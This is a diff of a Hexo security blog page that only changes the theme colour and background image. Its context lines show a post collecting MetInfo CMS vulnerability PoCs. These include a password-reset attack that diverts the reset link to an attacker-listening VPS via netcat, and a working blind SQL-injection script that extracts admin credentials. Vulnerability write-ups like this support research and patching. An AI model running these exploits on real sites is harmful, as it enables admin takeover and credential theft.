@@ -41,7 +41,7 @@
 color="100,238,23" opacity='0.7' zIndex="-2" count="100" src="../../js/canvas-nest.min.js"></script>
  
   
-<body style="background: url(../../images/back.jpg); background-repeat: no-repeat;
+<body style="background: url(http://p4gdp8beq.bkt.clouddn.com/back1.png); background-repeat: no-repeat;
   background-size: 100% 100%;">
 
   
@@ -398,7 +398,7 @@ window.onload = function()
 
 
             </div>
-            <time class="pink-link-context" datetime="2018-10-19T10:14:00.000Z"><a href="/posts/797044V1.html">2018-10-19</a></time>
+            <time class="red-link-context" datetime="2018-10-19T10:14:00.000Z"><a href="/posts/797044V1.html">2018-10-19</a></time>
 
             <span id="busuanzi_container_page_pv" class="read-times-container">
     <i class="fa fa-eye"></i>
@@ -417,12 +417,12 @@ window.onload = function()
     </div>
 
 
-            <div class="toc pink-link-context hide-on-med-and-down">
+            <div class="toc red-link-context hide-on-med-and-down">
     <ol class="section table-of-contents"><li class="section table-of-contents-item section table-of-contents-level-1"><a class="section table-of-contents-link" href="#某CMS-5-X版本-管理员密码重置漏洞"><span class="section table-of-contents-text">某CMS 5.X版本 管理员密码重置漏洞</span></a></li><li class="section table-of-contents-item section table-of-contents-level-1"><a class="section table-of-contents-link" href="#某CMS-5-X版本GETSHELL漏洞合集"><span class="section table-of-contents-text">某CMS 5.X版本GETSHELL漏洞合集</span></a><ol class="section table-of-contents-child"><li class="section table-of-contents-item section table-of-contents-level-2"><a class="section table-of-contents-link" href="#0x02-后台CVE-2017-11347补丁绕过继续Getshell"><span class="section table-of-contents-text">0x02 后台CVE-2017-11347补丁绕过继续Getshell</span></a></li><li class="section table-of-contents-item section table-of-contents-level-2"><a class="section table-of-contents-link" href="#0x04-后台olupdate文件缺陷导致Getshell"><span class="section table-of-contents-text">0x04 后台olupdate文件缺陷导致Getshell</span></a></li></ol></li><li class="section table-of-contents-item section table-of-contents-level-1"><a class="section table-of-contents-link" href="#Metinfo5-3-10文件包含分析"><span class="section table-of-contents-text">Metinfo5.3.10文件包含分析</span></a></li><li class="section table-of-contents-item section table-of-contents-level-1"><a class="section table-of-contents-link" href="#Metinfo-5-3-17-前台SQL注入漏洞分析"><span class="section table-of-contents-text">Metinfo 5.3.17 前台SQL注入漏洞分析</span></a></li><li class="section table-of-contents-item section table-of-contents-level-1"><a class="section table-of-contents-link" href="#Metinfo-6-0-0-任意文件读取漏洞"><span class="section table-of-contents-text">Metinfo 6.0.0 任意文件读取漏洞</span></a></li><li class="section table-of-contents-item section table-of-contents-level-1"><a class="section table-of-contents-link" href="#Metinfo-6-0-0任意文件删除"><span class="section table-of-contents-text">Metinfo 6.0.0任意文件删除</span></a></li><li class="section table-of-contents-item section table-of-contents-level-1"><a class="section table-of-contents-link" href="#Metinfo-v6-0-0-getshell-in-background"><span class="section table-of-contents-text">Metinfo v6.0.0 getshell in background</span></a></li><li class="section table-of-contents-item section table-of-contents-level-1"><a class="section table-of-contents-link" href="#代码审计-MetInfo6-0-0漏洞集合（一）"><span class="section table-of-contents-text">[代码审计] MetInfo6.0.0漏洞集合（一）</span></a><ol class="section table-of-contents-child"><li class="section table-of-contents-item section table-of-contents-level-2"><a class="section table-of-contents-link" href="#ox01后台sql注入"><span class="section table-of-contents-text">ox01后台sql注入</span></a></li></ol></li><li class="section table-of-contents-item section table-of-contents-level-1"><a class="section table-of-contents-link" href="#Metinfo-6-1-2-SQL注入"><span class="section table-of-contents-text">Metinfo 6.1.2 SQL注入</span></a></li></ol>
 </div>
 
 
-            <div class="entry pink-link-context">
+            <div class="entry red-link-context">
                 <h1 id="某CMS-5-X版本-管理员密码重置漏洞"><a href="#某CMS-5-X版本-管理员密码重置漏洞" class="headerlink" title="某CMS 5.X版本 管理员密码重置漏洞"></a>某CMS 5.X版本 管理员密码重置漏洞</h1><p><a href="https://xz.aliyun.com/t/2097" target="_blank" rel="noopener">https://xz.aliyun.com/t/2097</a><br>poc:<br>在vps上监听80端口<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nc -lvv -p 80</span><br></pre></td></tr></table></figure></p>
 <p>访问后台登陆，重置密码  在填入管理员密码或邮箱后，抓包修改数据：在post数据后面 添加&amp;met_fd_port=12345&amp;met_host=vps的ip地址</p>
 <p><img src="/posts/../../images/cms/metinfo1.png" alt=""><br>forward后，访问反弹到vps的链接<br><img src="/posts/../../images/cms/metinfo2.png" alt=""><br>即可重置管理员密码<br><img src="/posts/../../images/cms/metinfo3.png" alt=""></p>
@@ -453,7 +453,7 @@ window.onload = function()
 <h1 id="Metinfo-6-1-2-SQL注入"><a href="#Metinfo-6-1-2-SQL注入" class="headerlink" title="Metinfo 6.1.2 SQL注入"></a>Metinfo 6.1.2 SQL注入</h1><p><a href="https://bbs.ichunqiu.com/thread-46687-1-1.html" target="_blank" rel="noopener">https://bbs.ichunqiu.com/thread-46687-1-1.html</a><br>脚本中的sql根据情况而定。<br>poc:<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># @Date    : 2018-10-20 14:54:00</span></span><br><span class="line"><span class="comment"># @Author  : yeSi (you@example.org)</span></span><br><span class="line"><span class="comment"># @Link    : http://example.org</span></span><br><span class="line"><span class="comment"># @Version : $Id$</span></span><br><span class="line"></span><br><span class="line">import requests</span><br><span class="line">import string</span><br><span class="line">url=<span class="string">"http://192.168.0.6/metinfo612/admin/index.php?m=web&amp;n=message&amp;c=message&amp;a=domessage&amp;action=add&amp;lang=cn&amp;para137=1&amp;para186=1&amp;para138=1&amp;para139=1&amp;para140=1&amp;id=42 "</span></span><br><span class="line">chars=<span class="string">"0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!\"#$%&amp;'()*+,-./:;&lt;=&gt;?@[\\]^_`&#123;|&#125;~ "</span></span><br><span class="line"><span class="built_in">test</span>=0</span><br><span class="line">flag=<span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(33):</span><br><span class="line">	<span class="keyword">if</span> <span class="built_in">test</span>==1:</span><br><span class="line">		<span class="built_in">break</span></span><br><span class="line">	<span class="keyword">for</span> j <span class="keyword">in</span> chars:</span><br><span class="line">		sql=<span class="string">"and ascii(substr((select group_concat(admin_id,admin_pass) from met_admin_table limit 0,1),&#123;0&#125;,1)) =&#123;1&#125;"</span>.format(i+1,ord(j))</span><br><span class="line">		<span class="comment"># sql="and ascii(substr((select admin_id from met_admin_table limit 0,1),&#123;0&#125;,1)) =&#123;1&#125;".format(i+1,ord(j))</span></span><br><span class="line">		payload=url+sql</span><br><span class="line">		r=requests.get(payload)</span><br><span class="line">		<span class="keyword">if</span> <span class="string">'验证码错误'</span> <span class="keyword">in</span> r.content:</span><br><span class="line">			flag+=j</span><br><span class="line">			<span class="built_in">print</span> flag</span><br><span class="line">			<span class="built_in">break</span></span><br><span class="line">		<span class="keyword">if</span> j==chars[-1]:</span><br><span class="line">			<span class="built_in">test</span>=1</span><br><span class="line"><span class="built_in">print</span> <span class="string">'flag is :'</span>,flag</span><br></pre></td></tr></table></figure></p>
 
                 
-<p class="pink-link-context">
+<p class="red-link-context">
     <a href="/posts/797n44d1.html" rel="next" title="joomla">
     Prev: joomla
   </a>
@@ -461,7 +461,7 @@ window.onload = function()
 
 
 
-<p class="pink-link-context">
+<p class="red-link-context">
     <a href="/posts/7a7044d1.html" rel="next" title="seacms">
     Next: seacms
   </a>
@@ -687,7 +687,7 @@ var visitor = true;
     </div>
     
 
-    <div class="footer-copyright pink-link-context">
+    <div class="footer-copyright red-link-context">
         <div class="container">
             © 2016 example.com, All rights reserved.
             <p class="right" style="margin-top: 0;">Blog powered by <a href="https://hexo.io">Hexo</a> | Theme <a href="https://github.com/raytaylorlin/hexo-theme-raytaylorism">raytaylorism</a></p>
@@ -863,7 +863,7 @@ var visitor = true;
                             if (isMatch) {
                                 keywords.forEach(function(keyword) {
                                     var regS = new RegExp(keyword, "gi");
-                                    data_title = data_title.replace(regS, "<span class=\"search-keyword pink lighten-2\">" + keyword + "</span>");
+                                    data_title = data_title.replace(regS, "<span class=\"search-keyword red lighten-2\">" + keyword + "</span>");
                                 });
 
                                 str += "<li><a href='" + data_url + "' class='search-result-title'>" + data_title + "</a>";
@@ -885,7 +885,7 @@ var visitor = true;
                                     // highlight all keywords
                                     keywords.forEach(function(keyword) {
                                         var regS = new RegExp(keyword, "gi");
-                                        match_content = match_content.replace(regS, "<span class=\"search-keyword pink lighten-2\">" + keyword + "</span>");
+                                        match_content = match_content.replace(regS, "<span class=\"search-keyword red lighten-2\">" + keyword + "</span>");
                                     });
 
                                     str += "<p class=\"search-result\">..." + match_content + "...</p>"
